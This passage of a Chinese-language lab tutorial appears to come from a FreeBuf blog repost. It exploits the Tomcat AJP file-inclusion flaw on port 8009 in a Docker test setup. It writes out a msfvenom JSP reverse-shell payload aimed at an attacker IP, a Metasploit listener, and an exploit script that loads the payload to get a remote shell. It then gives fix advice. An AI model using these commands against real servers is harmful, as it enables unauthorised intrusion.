msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > exploit -j

```

可以去 docker 底层看看

```
python2 文件包含.py 192.168.175.191 -p 8009 -f shell.txt

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaYoCOUBI4xmLBEHZcfiaJOBukhmz95WmZUqHiaV7heCo2ibBzzzY6Nlpew/640?wx_fmt=jpeg)

成功传上去了

开启 nc 监听

具体可以看这里：

https://blog.csdn.net/qq\_30653631/article/details/93749505?utm\_medium=distribute.pc\_aggpage\_search\_result.none-task-blog-2\~aggregatepage\~first\_rank\_v2\~rank\_aggregation-1-93749505.pc\_agg\_rank\_aggregation&utm\_term=Ubuntu%E5%AE%89%E8%A3%85nc&spm=1000.2123.3001.4430

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QarDFGiaHOiatgzSGwmAQZjtj2RDMog7XvAHZ5uvR53ukEPlFHbBPy6r8A/640?wx_fmt=jpeg)

```
<Connector port="8009"protocol="AJP/1.3" redirectPort="8443" />

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9Qa9icRKdgcs7HpiaJuic6pGObCbcY4LUpnZg4SRic9VGKGwcoVoYIBicP1FXg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QarrarLkD3ye3bv9f0yicPbeFLtnrK68Hw13ZAvYiaqV3wT4X9O8YZGZRQ/640?wx_fmt=jpeg)

可以看到成功上线了

**可以和 War 联动是吧 可以和 PUT 联动**

#### 把 shell 弹到 MSF 上

MSF 生成木马

我这边还是上 kali 吧 Ubuntu 不是很顺手

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.175.167 LPORT=4444 R > shell.txt
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9Qa0icStfBgVNwwlHt0LhFjG93Orq7iaUaMffhaWtQLyZvprGZJjZXoR1tg/640?wx_fmt=jpeg)

```
sudo docker cp /home/dayu/Desktop/shell.txt 6c80deb9d194:/usr/local/tomcat/webapps/ROOT
```

去 docker 底层看看

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaHhBoHlCVge0Ez2Plp6fz6nHicAL4nUMaJpoicwfyelbfCd63iawtSicXuQ/640?wx_fmt=jpeg)

上 MSF 开启监听

执行文件包含 RCE

```
python2 文件包含.py 192.168.175.191 -p 8009 -f shell.txt
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaAYFficAc6SI0XdcWnUNFtcax0W7icv6U2dPiaPeYUbPl2ycjGsegtibicIg/640?wx_fmt=jpeg)

可以看到已经拿到 shell 了

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaOTjmJ7TyRbVTfjnP61LZnUNjjTfpslEe5ndriapJ5xuLg9iaG0qrb4EA/640?wx_fmt=jpeg)

按 shell 就可以进来了

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9Qa0tdBCTiahre0Ng9RAibpLPAXyG9NhtvMVVyFB1vhPV7QXQ0yOhzSlvxg/640?wx_fmt=jpeg)

修复建议

1、将 Tomcat 立即升级到 9.0.31、8.5.51 或 7.0.100 版本进行修复  
2、禁用 AJP 协议  
具体方法：

编辑`/conf/server.xml`，找到如下行：

```
<Connector port="8009"protocol="AJP/1.3" redirectPort="8443" />
```

注释或删除

3、配置 secret 来设置 AJP 协议的认证凭证。  

![](https://mmbiz.qpic.cn/mmbiz_gif/qq5rfBadR38Tm7G07JF6t0KtSAuSbyWtgFA8ywcatrPPlURJ9sDvFMNwRT0vpKpQ14qrYwN2eibp43uDENdXxgg/640?wx_fmt=gif)

![](http://mmbiz.qpic.cn/mmbiz_png/3Uce810Z1ibJ71wq8iaokyw684qmZXrhOEkB72dq4AGTwHmHQHAcuZ7DLBvSlxGyEC1U21UMgSKOxDGicUBM7icWHQ/640?wx_fmt=png&wxfrom=200) 交易担保 FreeBuf+ FreeBuf + 小程序：把安全装进口袋 小程序

  

精彩推荐

  

  

  

  

****![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ib2xibAss1xbykgjtgKvut2LUribibnyiaBpicTkS10Asn4m4HgpknoH9icgqE0b0TVSGfGzs0q8sJfWiaFg/640?wx_fmt=jpeg)****

  

[![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9Qa7ziag03WLN71NL5icWxBsNPGzNlDEQrNVpjoIRnmglkpJ61iaP7giaBZww/640?wx_fmt=jpeg)](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247486404&idx=1&sn=6d434a8d335887fc665287732933091d&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR384iaX6B8n12ebKz8LqibnrDQTyFTVGgeUQ20OH45Z1KqtjzL83XLEjDicq9Sbvd5SeXyUbd7iaWFdmHw/640?wx_fmt=jpeg)](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247486350&idx=1&sn=ce56524dc187468146dc23a991b0596a&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibQicaAF2AhFiartqpalE3cqyDGxViayXC2U7iaib3VUDur9XiaNHFkYmLr6o1j0HtlL1n8ooT76QfATWhw/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247486265&idx=1&sn=8a02ee0c67815bd4aede3515514f1048&chksm=ce1cf1a6f96b78b011faf0c5b9c8461dd78cd918f47ca871588ab87c9cbc5857fc85f32e875d&scene=21#wechat_redirect)

**************![](https://mmbiz.qpic.cn/mmbiz_gif/qq5rfBadR3icF8RMnJbsqatMibR6OicVrUDaz0fyxNtBDpPlLfibJZILzHQcwaKkb4ia57xAShIJfQ54HjOG1oPXBew/640?wx_fmt=gif)**************